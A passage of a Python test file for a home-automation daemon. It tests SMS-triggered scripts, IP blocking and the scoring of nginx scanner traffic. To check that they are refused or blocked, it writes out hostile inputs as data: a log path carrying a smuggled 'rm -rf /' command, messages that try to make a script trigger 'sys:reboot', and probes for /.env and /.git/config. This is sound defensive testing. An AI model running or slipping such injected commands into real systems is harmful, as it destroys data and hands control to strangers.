assert _f2['skript02.returnvar01'] == 'second' and 'skript01.returnvar01' not in _f2, _f2
# a name written down but never set is still offered, empty rather than raw
_three = d.save_scripts([{'name': 'Skript03', 'body': 'say nothing to see',
                          'results': [{'name': 'never_set'}]}])
_f3 = d.script_result_facts(d.run_script(_three[-1], {}, 'a test'), _three[-1])
assert _f3.get('never_set') == '' and _f3.get('skript03.never_set') == '', _f3
assert daemon_fill(d, 'it says {Skript01.returnvar01}', _f1) == 'it says first'
# and what a text command hands a script is there under its own words too
_k = d.save_scripts([{'name': 'Echo', 'body':
                      'answer plain={word} sms={sms.word} in={in.word} phrase={echo.word}'}])
_sent[:] = []
_was_send2 = d.sms_send
d.sms_send = lambda number, text, **k: (_sent.append((number, text)), (True, 'ok'))[1]
try:
    d.save_sms_commands([{'phrase': 'echo', 'target': 'script:' + _k[-1]['id'], 'do': 'script',
                          'from_anyone': True, 'vars': [{'name': 'word', 'from': 'rest'}],
                          'reply': '{result} | {Echo.result}'}])
    d.sms_handle('+420123', 'echo hello')
    assert _waited() and _sent[-1][1] == 'plain=hello sms=hello in=hello phrase=hello | ' \
        'plain=hello sms=hello in=hello phrase=hello', _sent[-1:]
finally:
    d.sms_send = _was_send2
    d.save_sms_commands([])
    d.save_scripts([])
print('every name says whose it is: {sms.x} and {in.x} coming in, {out.x} and {Skript01.x} going back')

# A script says which names it wants, and a rule that declared none still
# gives them: the words after the phrase are handed over in order. Declaring
# one is a way of being particular, not a thing to remember before anything
# works at all.
zigmon.CONFIG.update({'blacklist': 1, 'sms_reply': 0})
_k = d.save_scripts([{'name': 'Ban', 'body': 'ban {myip}\nsay banned {myip}'}])
d.save_sms_commands([{'phrase': 'ban', 'target': 'script:' + _k[0]['id'], 'do': 'script',
                      'from_anyone': True}])
d.store.unblock()
d.sms_handle('+420123', 'ban 1.2.3.4')
assert [r['ip'] for r in d.blocked_list()] == ['1.2.3.4'], \
    'a script got nothing from a command that declared nothing'
d.store.unblock()
d.save_sms_commands([{'phrase': 'ban', 'target': 'script:' + _k[0]['id'], 'do': 'script',
                      'from_anyone': True, 'vars': [{'name': 'myip', 'from': ''}]}])
d.sms_handle('+420123', 'ban 5.6.7.8')
assert [r['ip'] for r in d.blocked_list()] == ['5.6.7.8'], 'a declared name was not used'
d.store.unblock()
d.save_sms_commands([{'phrase': 'ban', 'target': 'script:' + _k[0]['id'], 'do': 'script',
                      'from_anyone': True}])
d.sms_handle('+420123', 'ban')
assert not d.blocked_list(), 'a message with nothing in it kept somebody out'
# and a press does the same with what it carried
d.save_taps([{'name': 'Ban', 'target': 'script:' + _k[0]['id'], 'do': 'script'}])
zigmon.CONFIG['tap_mode'] = 'header'
zigmon.CONFIG['tap_code'] = 0
_ok, _answer = d.tap(d.taps()[0]['token'], '1.2.3.4', way='header', carried={'address': '7.7.7.7'})
assert [r['ip'] for r in d.blocked_list()] == ['7.7.7.7'], \
    'a press carrying one value did not fill the name the script wanted: %r' % (_answer,)
d.store.set_meta('taps', json.dumps(_was_taps))
zigmon.CONFIG['tap_mode'] = 'both'
d.save_sms_commands([])
d.save_scripts([])
d.store.unblock()
print('a script is given the names it wants, declared or not')

# The whole matrix, both roads: a name written into the phrase, one declared
# in order, one declared as a word by number, one taking everything after the
# phrase, one declared nowhere at all, two at once - and the same by a press,
# named after the header, reading another header, or taken from whatever the
# press carried.
zigmon.CONFIG.update({'blacklist': 1, 'sms_reply': 1, 'tap_mode': 'header', 'tap_code': 0})
_sent = []
_was_send = d.sms_send
_was_reply = d.sms_reply
d.sms_send = lambda to, text, why='': _sent.append(text)
# since 4.53.0 an answer is handed to a worker through sms_reply; these checks
# are about WHAT it says, so here it goes straight into the same list
d.sms_reply = lambda to, text: _sent.append(text)


def _by_text(body, command, text):
    _made = d.save_scripts([{'name': 'S', 'body': body}])
    d.save_sms_commands([dict(command, target='script:' + _made[0]['id'], do='script',
                              from_anyone=True)])
    d.store.unblock()
    del _sent[:]
    d.sms_handle('+420123', text)
    return [r['ip'] for r in d.blocked_list()], (_sent[-1] if _sent else '')


assert _by_text('ban {ip}', {'phrase': 'ban {ip}'}, 'ban 1.1.1.1')[0] == ['1.1.1.1'], 'a name in the phrase'
assert _by_text('ban {ip}', {'phrase': 'ban', 'vars': [{'name': 'ip', 'from': ''}]},
                'ban 2.2.2.2')[0] == ['2.2.2.2'], 'a name declared in order'
assert _by_text('ban {ip}', {'phrase': 'ban', 'vars': [{'name': 'ip', 'from': '2'}]},
                'ban now 3.3.3.3')[0] == ['3.3.3.3'], 'a name declared as the second word'
assert 'the gate is loud' in _by_text('say note: {note}',
                                      {'phrase': 'note', 'vars': [{'name': 'note', 'from': 'all'}]},
                                      'note the gate is loud')[1], 'a name taking everything after'
assert _by_text('ban {ip}', {'phrase': 'ban'}, 'ban 4.4.4.4')[0] == ['4.4.4.4'], 'nothing declared'
assert _by_text('ban {ip} {mins}', {'phrase': 'ban'}, 'ban 5.5.5.5 15')[0] == ['5.5.5.5'], 'two names'
_kept, _said = _by_text('ban {ip}', {'phrase': 'ban', 'reply': 'Banned {ip}'}, 'ban 6.6.6.6')
assert _said == 'Banned 6.6.6.6', 'a command with its own answer did not get to say it: %r' % _said
d.sms_send = _was_send
d.sms_reply = _was_reply


def _by_press(body, taps_vars, carried):
    _made = d.save_scripts([{'name': 'S', 'body': body}])
    d.save_taps([dict({'name': 'L', 'target': 'script:' + _made[0]['id'], 'do': 'script'},
                      vars=taps_vars)])
    d.store.unblock()
    _ok, _answer = d.tap(d.taps()[0]['token'], '1.2.3.4', way='header', carried=carried)
    return [r['ip'] for r in d.blocked_list()], (_answer.get('message') or '')


assert _by_press('ban {ip}', [], {'ip': '8.8.8.8'})[0] == ['8.8.8.8'], 'a header named like the name'
assert _by_press('ban {ip}', [{'name': 'ip', 'from': 'X-Zigmon-Arg-Address'}],
                 {'address': '9.9.9.9'})[0] == ['9.9.9.9'], 'a name reading another header'
assert _by_press('ban {ip}', [], {'whatever': '10.10.10.10'})[0] == ['10.10.10.10'], \
    'a press carrying one value, named nothing'
assert _by_press('ban {ip} {mins}', [], {'ip': '11.11.11.11', 'mins': '5'})[0] == ['11.11.11.11'], \
    'two names carried by a press'
assert 'Loznice' in _by_press('say it is {room}', [], {'room': 'Loznice'})[1], \
    'a name in a report a press asked for'
d.store.set_meta('taps', json.dumps(_was_taps))
zigmon.CONFIG['tap_mode'] = 'both'
d.save_sms_commands([])
d.save_scripts([])
d.store.unblock()
print('every way a name can arrive, by text and by press, fills what the script asks for')

# An answer written by hand says what was meant to happen; it must not be
# allowed to say it over the top of a line that did not happen. And a line
# naming something that is not here switched nothing while saying nothing,
# which reads exactly like a script that did its work.
_sent = []
_was_send = d.sms_send
_was_reply = d.sms_reply
d.sms_send = lambda to, text, why='': _sent.append(text)
# since 4.53.0 an answer is handed to a worker through sms_reply; these checks
# are about WHAT it says, so here it goes straight into the same list
d.sms_reply = lambda to, text: _sent.append(text)
zigmon.CONFIG.update({'sms_reply': 1, 'blacklist': 1})
_made = d.save_scripts([{'name': 'Ban', 'body': 'ban {myip}'}])
d.save_sms_commands([{'phrase': 'ban', 'target': 'script:' + _made[0]['id'], 'do': 'script',
                      'reply': 'Banned {myip}', 'from_anyone': True}])
d.store.unblock()
del _sent[:]
d.sms_handle('+420123', 'ban')
assert 'stood for nothing' in _sent[-1], 'the answer hid a line that did not happen: %r' % _sent[-1]
del _sent[:]
d.sms_handle('+420123', 'ban 1.2.3.4')
assert _sent[-1] == 'Banned 1.2.3.4', 'a line that worked was talked over: %r' % _sent[-1]
assert [r['ip'] for r in d.blocked_list()] == ['1.2.3.4']
# something that is not here, refused while somebody is looking at it
try:
    d.save_scripts([{'name': 'X', 'body': 'on No-Such-Plug'}])
    raise AssertionError('a line naming nothing real was accepted')
except ValueError as e:
    assert 'nothing here called' in str(e), str(e)
# ...and refused at the moment it runs, when the name came from the message
_made = d.save_scripts([{'name': 'X', 'body': 'on {thing}'}])
d.save_sms_commands([{'phrase': 'go', 'target': 'script:' + _made[0]['id'], 'do': 'script',
                      'reply': 'Done', 'from_anyone': True}])
del _sent[:]
d.sms_handle('+420123', 'go No-Such-Plug')
assert 'nothing here called' in _sent[-1], 'switching nothing said nothing: %r' % _sent[-1]
d.sms_send = _was_send
d.sms_reply = _was_reply
d.save_sms_commands([])
d.save_scripts([])
d.store.unblock()
print('an answer cannot talk over a line that did not happen')

# A script with nothing in it did nothing and said nothing, and an answer
# written by hand went back as though it had worked. It says so now, which is
# the difference between "it did not work" and "nothing happened and nobody
# will tell you why".
_sent = []
_was_send = d.sms_send
_was_reply = d.sms_reply
d.sms_send = lambda to, text, why='': _sent.append(text)
# since 4.53.0 an answer is handed to a worker through sms_reply; these checks
# are about WHAT it says, so here it goes straight into the same list
d.sms_reply = lambda to, text: _sent.append(text)
zigmon.CONFIG.update({'sms_reply': 1, 'blacklist': 1})
_made = d.save_scripts([{'name': 'Ban', 'body': ''}])
d.save_sms_commands([{'phrase': 'ban', 'target': 'script:' + _made[0]['id'], 'do': 'script',
                      'reply': 'Banned {myip}', 'from_anyone': True}])
d.store.unblock()
del _sent[:]
d.sms_handle('+420123', 'ban 1.2.3.4')
assert 'no lines in it' in _sent[-1], 'an empty script said nothing about itself: %r' % _sent[-1]
assert not d.blocked_list(), 'an empty script kept somebody out'
d.sms_send = _was_send
d.sms_reply = _was_reply
d.save_sms_commands([])
d.save_scripts([])
print('a script with nothing in it says so instead of looking like one that worked')

# {myip) is not a name, it is a name with the wrong bracket on the end - and
# it reads as ordinary words, so the line acts on the characters themselves
# and answers "{myip) is not an address".
for _typo in ('ban {myip)', 'ban {myip', 'unban {ip]'):
    try:
        d.save_scripts([{'name': 'X', 'body': _typo}])
        raise AssertionError('%r was accepted as a line' % _typo)
    except ValueError as e:
        assert 'name ends with }' in str(e) or 'without its }' in str(e), str(e)
d.save_scripts([{'name': 'X', 'body': 'say hello (world)'}])       # ordinary brackets are fine
d.save_scripts([])
print('a name closed with the wrong bracket is refused, not acted on')

# A script runs on the thread that asked for it, so the waiting in the whole
# of it is capped rather than only the waiting on one line: five lines of
# "wait 30" held a press for two and a half minutes.
_made = d.save_scripts([{'name': 'W', 'body': '\n'.join(['wait 30'] * 5)}])
_began = time.time()
_out = d.run_script(_made[0], {}, 'a test')
assert time.time() - _began < 40, 'a script slept for %.0f s' % (time.time() - _began)
assert 'may not sleep longer' in _out['said'], 'it slept less and said nothing about it'

# And a name filled in from outside may not stand for what the house does to
# itself: "on {thing}" with a command anybody may text would otherwise let a
# stranger name sys:reboot.
_fired = []
_was_fire, _was_valid = d._fire_target, d._valid_target
d._fire_target = lambda target, do, origin, **k: _fired.append((target, do))
d._valid_target = lambda t: True
_made = d.save_scripts([{'name': 'X', 'body': 'on {thing}'}])
d.save_sms_commands([{'phrase': 'go', 'target': 'script:' + _made[0]['id'], 'do': 'script',
                      'from_anyone': True}])
for _bad in ('go sys:reboot', 'go act:1', 'go rule:2', 'go script:abc'):
    del _fired[:]
    d.sms_handle('+420999', _bad)
    assert not _fired, '%r reached %r' % (_bad, _fired)
del _fired[:]
d.sms_handle('+420999', 'go Plug-UPS')
assert _fired == [('Plug-UPS', 'on')], 'an ordinary name stopped working: %r' % _fired
# written out by the person who wrote the script, it is allowed
del _fired[:]
d.run_script(d.save_scripts([{'name': 'Y', 'body': 'on sys:reboot'}])[0], {}, 'a test')
assert _fired == [('sys:reboot', 'on')], 'a line written out by hand was refused'
d._fire_target, d._valid_target = _was_fire, _was_valid
d.save_sms_commands([])
d.save_scripts([])
print('a script cannot be made to sleep for ever, or to name the house itself from a message')

# The blocked list is drawn once a second while the tab is open, and what is
# written under "never kept out" was read afresh for every address on it: five
# hundred against thirty ranges came to three hundred thousand parses.
zigmon.CONFIG['never_block'] = ', '.join('192.168.%d.0/24' % i for i in range(30))
d.store.unblock()
for _i in range(300):
    d.store.block('10.%d.%d.%d' % (_i // 255, _i % 255, _i % 7), time.time() + 3600, 'a test')
d.store.block('192.168.5.9', None, 'in a spared street')
d.store.flush()
# The best of three rounds, not the average of one: what this guards against
# is the list walking the spare ranges for every row again (70 ms), and a
# busy machine pausing the test for a moment is not that.
_rounds = []
for _r in range(3):
    _began = time.time()
    for _ in range(10):
        _rows = d.blocked_list()
    _rounds.append((time.time() - _began) / 10 * 1000)
_each = min(_rounds)
assert _each < 25, 'the blocked list takes %.0f ms to draw' % _each
_marks = {r['ip']: r['spared'] for r in _rows}
assert _marks['192.168.5.9'] == '192.168.5.0/24', 'and it stopped sparing the right ones'
assert not _marks['10.0.0.0'], 'it spared one it should not'
# and it follows the setting when that changes
zigmon.CONFIG['never_block'] = '10.0.0.0'
_marks = {r['ip']: r['spared'] for r in d.blocked_list()}
assert _marks['10.0.0.0'] == '10.0.0.0' and not _marks['192.168.5.9'], \
    'the list it reads is remembered past the setting being changed'
zigmon.CONFIG['never_block'] = ''
d.store.unblock()
print('the blocked list is drawn in a few milliseconds, and still spares what it should')

# The log of the server in front sees what the public tries and gives up on
# before any of it reaches this machine: a path that is not there, a method
# nobody uses, a burst. None of that was ever weighed.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'proxy_host': 'p',
                      'proxy_log': '/var/log/nginx/zigmon-tap.log', 'never_block': ''})
_was_within, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
d.store.unblock()
d.forget_anomaly()
_log = [
    '89.24.57.142 - - [15/Sep/2026:13:37:23 +0200] "POST /tap HTTP/1.1" 200 41 "-" "Shortcuts/2.0"',
    '185.234.9.7 - - [15/Sep/2026:13:37:24 +0200] "GET /.env HTTP/1.1" 404 146 "-" "python-requests"',
    '185.234.9.7 - - [15/Sep/2026:13:37:24 +0200] "GET /wp-login.php HTTP/1.1" 404 146 "-" "-"',
    '185.234.9.7 - - [15/Sep/2026:13:37:25 +0200] "GET /admin HTTP/1.1" 403 146 "-" "-"',
    '185.234.9.7 - - [15/Sep/2026:13:37:25 +0200] "GET /.git/config HTTP/1.1" 404 146 "-" "-"',
    '185.234.9.7 - - [15/Sep/2026:13:37:26 +0200] "POST /tap HTTP/1.1" 429 0 "-" "curl/8.0"',
    '2a02:1:2::9 - - [15/Sep/2026:13:37:27 +0200] "GET /backup.zip HTTP/1.1" 404 146 "-" "-"',
    'this is not a log line at all',
]
_weighed = d.proxy_weigh(_log)
assert '89.24.57.142' not in _weighed, 'a press that worked was weighed against whoever made it'
assert _weighed.get('185.234.9.7') == 5, 'the scanner was weighed %r times' % _weighed.get('185.234.9.7')
assert '2a02:1:2::9' in _weighed, 'an address of the other family was skipped'
_rows = {r['ip']: r for r in d.blocked_list()}
assert '185.234.9.7' in _rows, 'somebody working through a list was not kept out'
assert _rows['185.234.9.7']['from_proxy'], 'the line does not say where it was seen'
assert 'server in front' in _rows['185.234.9.7']['why'], 'nor does the reason'
# and something seen here is not marked as having come from there
d.note_anomaly('89.24.60.1', 'bad-secret', 'abc')
assert not [c for c in d.anomaly_state() if c['ip'] == '89.24.60.1' and c['from_proxy']], \
    'something seen here is marked as coming from the server in front'
# a path with something in it is refused rather than run
zigmon.CONFIG['proxy_log'] = '/var/log/nginx/t.log; rm -rf /'
try:
    d.proxy_path()
    raise AssertionError('a log path with a command in it was accepted')
except ValueError:
    pass
zigmon.CONFIG.update({'proxy_log': '/var/log/nginx/zigmon-tap.log', 'proxy_host': ''})
zigmon.Daemon.SAME_TRY_WITHIN = _was_within
d.store.unblock()
d.forget_anomaly()
print('the log of the server in front is read, weighed, and says where it was seen')

# A real nginx log from a server that has been on the internet for an
# afternoon: the pattern has to read it, and the scanners in it have to end up
# on the list. Written out here rather than read from a file so the guard
# carries its own evidence.
_real = [
    '46.227.172.22 - - [15/Sep/2026:12:48:10 +0200] "GET / HTTP/2.0" 404 548 "-" "Mozilla/5.0"',
    '46.227.172.22 - - [15/Sep/2026:12:48:10 +0200] "GET /favicon.ico HTTP/2.0" 404 548 "-" "Mozilla/5.0"',
    '136.69.201.246 - - [15/Sep/2026:14:18:36 +0200] "GET /.env HTTP/1.1" 404 548 "-" "Mozilla/5.0"',
    '136.69.201.246 - - [15/Sep/2026:14:18:37 +0200] "GET /.env.local HTTP/1.1" 404 548 "-" "Mozilla/5.0"',
    '136.69.201.246 - - [15/Sep/2026:14:18:37 +0200] "GET /.git/config HTTP/1.1" 404 548 "-" "Mozilla/5.0"',
    '136.69.201.246 - - [15/Sep/2026:14:18:58 +0200] "GET /phpinfo.php HTTP/1.1" 404 548 "-" "Mozilla/5.0"',
    '136.69.201.246 - - [15/Sep/2026:14:19:02 +0200] "GET /_profiler/phpinfo HTTP/1.1" 404 548 "-" "x"',
    '89.24.57.142 - - [15/Sep/2026:13:31:59 +0200] "POST /tap HTTP/2.0" 200 48 "-" "Shortcuts"',
    '69.67.183.104 - - [15/Sep/2026:14:38:34 +0200] "GET /?SSL_Labs_Renegotiation_Test=x HTTP/1.0" 400 0 "-" "SSL Labs"',
    '192.168.40.10 - - [15/Sep/2026:15:23:51 +0200] "\\x15\\x03\\x01\\x00\\x02\\x02P" 400 150 "-" "-"',
]
_read = sum(1 for _one in _real if d.PROXY_LINE.match(_one.strip()))
assert _read >= 9, 'the pattern read %d of 10 lines of a real nginx log' % _read
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'proxy_host': 'p',
                      'proxy_log': '/var/log/nginx/zigmon-tap.log', 'never_block': ''})
_was_within, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
d.store.unblock()
d.forget_anomaly()
_weighed = d.proxy_weigh(_real)
assert '89.24.57.142' not in _weighed, 'a press that worked was weighed against whoever made it'
assert _weighed.get('136.69.201.246', 0) >= 5, 'the scanner walking .env and .git was not weighed'
assert '136.69.201.246' in [r['ip'] for r in d.blocked_list()], 'and it was not kept out'
zigmon.Daemon.SAME_TRY_WITHIN = _was_within
zigmon.CONFIG['proxy_host'] = ''
d.store.unblock()
d.forget_anomaly()
print('a real afternoon of a public nginx log reads, weighs and ends on the list')

# One reading at a time. The SSH has its own timeout, but a proxy answering
# slowly while a reading is asked for every minute would pile threads up, each
# starting from an offset the one before had not finished writing.
import threading as _threading
zigmon.CONFIG.update({'proxy_host': 'p', 'proxy_log': '/var/log/nginx/t.log', 'proxy_watch': 1})
d.store.set_meta('proxy_at', '0')
_state = {'text': '1.2.3.4 - - [15/Sep/2026:13:00:00 +0200] "GET /.env HTTP/1.1" 404 1 "-" "-"\n',
          'calls': 0}


def _slow_log(cmd):
    _state['calls'] += 1
    if cmd.startswith('stat'):
        return str(len(_state['text'].encode()))
    time.sleep(0.8)                       # a proxy that answers slowly
    _at = int(cmd.split('+')[1].split()[0]) - 1
    return _state['text'][_at:_at + 2000000]


d.proxy_run = _slow_log
_threads = [_threading.Thread(target=d._proxy_quietly) for _ in range(5)]
for _t in _threads:
    _t.start()
for _t in _threads:
    _t.join()
assert _state['calls'] <= 3, ('five readings asked for at once sent %d commands to the proxy; '
                              'they are piling up' % _state['calls'])
assert d.store.get_meta('proxy_at') == str(len(_state['text'].encode())), \
    'the offset after a crowd of readings is not where the log ends'
zigmon.CONFIG['proxy_host'] = ''
d.store.unblock()
d.forget_anomaly()
print('however often a reading is asked for, one happens at a time')

# The clock has to ask for it. _proxy_quietly was written, the settings were
# there, the key was there, and nothing ever called it: a house that had set
# the whole thing up read the log once by hand and never again, and the only
# sign was an empty list, which is also what a quiet week looks like.
_src = open(str(__file__).rsplit('/', 2)[0] + '/zigmon.py').read()
_called = _src.count('_proxy_quietly')
assert _called >= 2, 'the reading of the proxy log is written but never called from the clock'
_loop = _src[_src.index('def tick_minute') if 'def tick_minute' in _src
             else _src.index('self.forget_old_waiting()') - 4000:]
assert 'target=self._proxy_quietly' in _src, 'nothing starts the reading on a thread'
# and the same for the router, which is hooked the same way
assert 'target=self._mikrotik_quietly' in _src, 'nothing starts the router sync on a thread'
print('the clock asks for the proxy log to be read, and for the router to be kept in step')

# A whole class of caller speaks no HTTP at all: a SOCKS handshake, a TLS
# record aimed at a plain port, a database protocol, a scanner's calling card.
# nginx writes the raw bytes and answers 400, and the strict pattern saw none
# of it - so the ones probing for an open proxy were the only visitors the
# house never noticed.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'proxy_host': 'p',
                      'proxy_log': '/x', 'never_block': ''})
_was_within, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
d.store.unblock()
d.forget_anomaly()
_junk = [
    '103.232.55.148 - - [16/Sep/2026:05:07:56 +0200] "\\x05\\x01\\x00" 400 150 "-" "-"',
    '103.232.55.148 - - [16/Sep/2026:05:07:56 +0200] "\\x04\\x01\\x00P\\x01\\x01\\x01\\x01\\x00" 400 150 "-" "-"',
    '103.232.55.148 - - [16/Sep/2026:05:07:57 +0200] "\\x05\\x01\\x00" 400 150 "-" "-"',
    '40.74.212.9 - - [16/Sep/2026:08:15:15 +0200] "MGLNDD_195.189.0.26_443" 400 150 "-" "-"',
    '89.24.57.142 - - [16/Sep/2026:08:20:00 +0200] "POST /tap HTTP/2.0" 200 48 "-" "Shortcuts"',
]
_weighed = d.proxy_weigh(_junk)
assert _weighed.get('103.232.55.148') == 3, \
    'a SOCKS handshake is still invisible: %r' % _weighed
assert '89.24.57.142' not in _weighed, 'a press that worked was weighed'
assert '103.232.55.148' in [r['ip'] for r in d.blocked_list()], \
    'three things that are not requests at all did not earn a block'
assert '40.74.212.9' not in [r['ip'] for r in d.blocked_list()], \
    'one odd packet earned a block, which a mistyped address would too'
zigmon.Daemon.SAME_TRY_WITHIN = _was_within
zigmon.CONFIG['proxy_host'] = ''
d.store.unblock()
d.forget_anomaly()
print('a caller that speaks no HTTP at all is weighed rather than ignored')

# Somebody walking addresses rather than names. The front server closes the
# connection without a word - 444 - and writes the line first, so the house
# can count what it refused rather than merely refusing it. A person types the
# name; a watch has the name in its link. Nobody does this by accident.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal',
                      'never_block': '', 'block_ladder': '', 'proxy_host': 'p', 'proxy_log': '/x'})
_was_same, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
d.store.unblock()
d.forget_anomaly()
_by_address = ['45.9.148.7 - - [16/Sep/2026:09:00:%02d +0200] "GET /tap HTTP/1.1" 444 0 "-" "-"' % _i
               for _i in range(5)]
_by_address.append('89.24.57.142 - - [16/Sep/2026:09:01:00 +0200] '
                   '"POST /tap HTTP/2.0" 200 48 "-" "Shortcuts"')
_weighed = d.proxy_weigh(_by_address)
assert _weighed.get('45.9.148.7') == 5, 'asking by address is not weighed: %r' % _weighed
assert '89.24.57.142' not in _weighed, 'a press that worked was weighed'
assert '45.9.148.7' in [r['ip'] for r in d.blocked_list()], \
    'five requests to the bare address did not earn a block'
assert 'by its address' in [r['why'] for r in d.blocked_list()][0], \
    'the reason does not say what it did'
zigmon.Daemon.SAME_TRY_WITHIN = _was_same
zigmon.CONFIG['proxy_host'] = ''
d.store.unblock()
d.forget_anomaly()
print('somebody asking for the machine by its address is counted, not only refused')

# nginx's other log: the callers it could not even get a request from. Real
# lines from a real server, including the ones about this house's own machine
# being slow to answer - which are nobody's fault but ours.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal',
                      'never_block': '', 'block_ladder': '', 'proxy_host': 'p',
                      'proxy_log': '/x', 'proxy_error_log': '/y'})
_was_same, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
d.store.unblock()
d.forget_anomaly()
_errors = [
    '2026/09/15 12:53:09 [error] 2066#2066: *4 upstream timed out (110: Connection timed out) while '
    'connecting to upstream, client: 89.24.57.142, server: mqtt.falco81.net, request: "POST /tap '
    'HTTP/2.0", upstream: "https://192.168.40.233:443/tap", host: "mqtt.falco81.net"',
]
# every two minutes: each line carries its own moment now, as the other logs'
# lines do, so they are written a few minutes apart rather than hours
for _i in range(5):
    _errors.append('%s [crit] 2350#2350: *6%d SSL_do_handshake() failed (SSL: '
                   'error:0A00006C:SSL routines::bad key share) while SSL handshaking, '
                   'client: 212.102.40.218, server: 0.0.0.0:443'
                   % (time.strftime('%Y/%m/%d %H:%M:%S', time.localtime(time.time() - 600 + _i * 120)), _i))
_errors.append('2026/09/16 09:00:00 [crit] 2350#2350: *700 SSL_read() failed (SSL: error:1C800066:'
               'Provider routines::cipher operation failed) while waiting for request, '
               'client: 45.9.148.9, server: 0.0.0.0:443')
_weighed = d.proxy_weigh_errors(_errors)
assert '89.24.57.142' not in _weighed, \
    'the house was weighed for its own server being slow to answer'
assert _weighed.get('212.102.40.218') == 5, 'five failed handshakes weighed %r' % _weighed
assert _weighed.get('45.9.148.9') == 1, 'a failed read was not weighed'
assert '212.102.40.218' in [r['ip'] for r in d.blocked_list()], \
    'an address failing a handshake every few minutes was not kept out'
assert '45.9.148.9' not in [r['ip'] for r in d.blocked_list()], \
    'one failed handshake earned a block, which a bad line would too'
zigmon.Daemon.SAME_TRY_WITHIN = _was_same
zigmon.CONFIG.update({'proxy_host': '', 'proxy_error_log': ''})
d.store.unblock()
d.forget_anomaly()
# ...and the reading of it has to actually work: the path comes from its own
# setting, not handed in - proxy_path takes no path, it takes the name of the
# setting to read, and calling it with one put "takes 0 positional arguments"
# in the trouble line where a reading should have been.
zigmon.CONFIG.update({'proxy_host': 'p', 'proxy_log': '/var/log/nginx/zigmon-tap.log',
                      'proxy_error_log': '/var/log/nginx/zigmon-tap-error.log'})
_now_stamp = time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime(time.time() - 60))
_files = {'/var/log/nginx/zigmon-tap.log':
          '45.9.148.7 - - [%s] "GET /.env HTTP/1.1" 404 1 "-" "-"\n' % _now_stamp,
          '/var/log/nginx/zigmon-tap-error.log':
          '%s [crit] 1#1: *1 SSL_do_handshake() failed (SSL: error:0A00006C:SSL '
          'routines::bad key share) while SSL handshaking, client: 45.9.148.8, server: 0.0.0.0:443\n'
          % time.strftime('%Y/%m/%d %H:%M:%S', time.localtime(time.time() - 60))}


def _two_logs(cmd):
    which = ('/var/log/nginx/zigmon-tap-error.log' if 'error' in cmd
             else '/var/log/nginx/zigmon-tap.log')
    text = _files[which]
    if cmd.startswith('stat'):
        return str(len(text.encode()))
    _at = int(cmd.split('+')[1].split()[0]) - 1
    return text[_at:_at + 2000000]


d.proxy_run = _two_logs
d.store.set_meta('proxy_at', '0')
d.store.set_meta('proxy_error_at', '0')
d.proxy_sweep()
assert not (d.store.get_meta('proxy_trouble') or ''), \
    'reading the two logs went wrong: %s' % d.store.get_meta('proxy_trouble')
_counted = {c['ip'] for c in d.anomaly_state()}
assert '45.9.148.7' in _counted, 'the access log was not weighed in the sweep'
assert '45.9.148.8' in _counted, 'the error log was not weighed in the sweep'
zigmon.CONFIG.update({'proxy_host': '', 'proxy_error_log': ''})
d.store.unblock()
d.forget_anomaly()
# What the router sheet shows beside a blocked address has to be the lines
# that address was judged on - not a handful of whatever is in the counter
# now. The counter holds only the last few minutes, so an hour later there was
# nothing to show, or worse, what the address had done SINCE, which reads as
# the reason and is not.
zigmon.CONFIG.update({'blacklist': 1, 'block_score': 15, 'block_sensitivity': 'normal',
                      'never_block': '', 'block_ladder': ''})
_was_same, zigmon.Daemon.SAME_TRY_WITHIN = zigmon.Daemon.SAME_TRY_WITHIN, 0
d.store.unblock()
d.forget_anomaly()
for _i in range(12):
    d.note_anomaly('203.0.113.50', 'proxy-poking', 'GET /.env%d' % _i, source='proxy')
_kept = [r for r in d.blocked_list() if r['ip'] == '203.0.113.50']
assert _kept, 'twelve refused paths did not earn a block'
_proof = json.loads(d.store.get_meta('blocked_proof_203.0.113.50') or '[]')
assert _proof, 'nothing was kept about what earned the block'
assert all(str(x[2]).startswith('GET /.env') for x in _proof), \
    'what was kept is not what it did: %r' % _proof[:2]
# ...and wiping the counters does not take the reason with it
d.forget_anomaly()
_again = json.loads(d.store.get_meta('blocked_proof_203.0.113.50') or '[]')
assert _again == _proof, 'the reason went with the counters'
zigmon.Daemon.SAME_TRY_WITHIN = _was_same
d.store.unblock()
d.forget_anomaly()
print('what earned a block is kept with the block, and survives the counters being wiped')
# When a log is rotated, whatever was written between the last reading and
# the rotation is in the rotated copy, not the new file. Without reading that
# copy's tail first, the last minutes of every day went unread.
_now_line = time.strftime('%d/%b/%Y:%H:%M:%S %z', time.localtime())
_mk = lambda ip, path: '%s - - [%s] "GET %s HTTP/1.1" 404 0 "-" "-"\n' % (ip, _now_line, path)
_logs = {'/var/log/nginx/zigmon-tap.log': _mk('1.1.1.1', '/a') * 10}


def _rotating(cmd):
    if cmd.startswith('for f in'):
        return '\n'.join(k for k in _logs if k.startswith('/var/log/nginx/zigmon-tap.log-'))
    which = [k for k in _logs if k in cmd]
    if not which:
        return ''
    body = _logs[max(which, key=len)]
    if cmd.startswith('stat'):
        return str(len(body.encode()))
    _at = int(cmd.split('+')[1].split()[0]) - 1
    return body[_at:_at + 2000000]


d.proxy_run = _rotating
zigmon.CONFIG.update({'proxy_host': 'p', 'proxy_log': '/var/log/nginx/zigmon-tap.log'})
d.store.set_meta('proxy_at', '0')
assert len(d.proxy_read()) == 10, 'the first reading did not read the file'
_logs['/var/log/nginx/zigmon-tap.log'] += _mk('2.2.2.2', '/b') + _mk('3.3.3.3', '/c')
_logs['/var/log/nginx/zigmon-tap.log-20260917'] = _logs['/var/log/nginx/zigmon-tap.log']
_logs['/var/log/nginx/zigmon-tap.log'] = _mk('4.4.4.4', '/d')
_after = [l.split()[0] for l in d.proxy_read()]
